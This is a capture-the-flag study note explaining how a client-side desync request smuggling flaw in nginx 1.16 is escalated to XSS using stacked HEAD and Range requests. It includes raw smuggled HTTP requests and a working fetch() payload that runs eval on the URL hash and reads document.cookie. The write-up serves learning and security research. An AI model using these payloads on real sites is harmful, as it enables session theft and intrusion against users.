# Overview
This is a Client-Side Desync Request Smuggling Challenge.

The nginx config only has one short line and it works.
I didn't get the flag in competition, so this is a studying note.
# Solution
The problem in the target is the nginx version.
If you search CVEs of nginx 1.16, you will see a request smuggling vulnerability CVE-2019-20372.

After reading the [Browser-Powerered Desync Attack](https://portswigger.net/research/browser-powered-desync-attacks), I know that request smuggling can be escalate to XSS by combining various techniques.

The request smuggling is quite simple, you just put other requests in the body and it will work.

Exmaple:
```
POST /a HTTP/1.1
Host: asd
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 26

GET / HTTP/1.1
Host:1


```
Why I tested this with POST is that we have to exploit this in frontend, and javascript `fetch()` can't send body with GET requests.

And you'll see two responses are returned in one response.

To escalate this to XSS, we can use Stacked HEAD technique in the article, HEAD requests will ask for response that only has headers, including the Content-Length header.
So we can trick chrome to think a HEAD request + other request are a single request, and reflect anything in the headers to the frontend.

This technique requires the header containing arbitrary input from user.
Most probably it will be a redirection.

But this challenge does sanitize the redirect destination, there cannot be special characters there, so we can't just add a `<script>` tag there and get the XSS.

This is where I learned something, we can actually use [Range Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests) to get specific characters from a response!

And we might be able to inject some event handlers to a tag and get our XSS!
Initailly, I was trying to add a `onload` to `<body>` tag, but I can't make it work, because it will become `<bodyHTTP/1.1` since it concats with the next reponse.

But actually that's enough, in HTML the tag will become `<bodyhttp>` and it'll be automatically closed by the browser, so we do have a custom tag here.

And since new line is ignored in html, all those headers will become attributes of the custom tag, combine this with the `Location` header we control, we can add event handlers and get the XSS!

Example request:
```
POST /a HTTP/1.1
Host: asd
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 164

HEAD / HTTP/1.1
Host: asdasdasdasdasd

GET / HTTP/1.1
Host:1
Connection: keep-alive
Range: bytes=206-211

GET /asd HTTP/1.1
Host: asd onload=alert(1) a


```

Example response:
```html
<bodyHTTP/1.1 302 Moved Temporarily
Server: nginx/1.16.1
Date: Mon, 23 Oct 2023 10:23:47 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://asd onload=alert(1) a/

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>

```

But all of these are done in burp, we need to exploit this in real frontend.
According to the article, we have to find a way to pollute the connection pool, so the chrome will take multiple responses as a single response.

What we have to do is using `fetch()` and its `then()`, if you do a `location="http://site.com"` in `then()`, the second request will end up using the same connection id!

But in this case, the first request is a 302 redirect, if we use `then()`, the page will be redirected first and the script won't be executed.

The article does have a solution for that, we just have to set the `fetch()` to "cors" mode and let it raise a error, and then we use `catch()` to run `location=...`, this will also do the trick.

So here is my final payload in frontend:
```html
<script>
fetch('http://192.168.65.129/a', {
    method: 'POST',
    
        // use a cache-buster to delay the response
            body: `HEAD / HTTP/1.1\r\nHost: a\r\n\r\nGET / HTTP/1.1\r\nHost: 1\r\nRange: bytes=206-211\r\n\r\nGET /a HTTP/1.1\r\nHost: asd autofocus tabindex=1 onfocus=eval(location.hash.slice(1)) a\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
        location = 'http://192.168.65.129/#alert(document.cookie)'
})
</script>
```
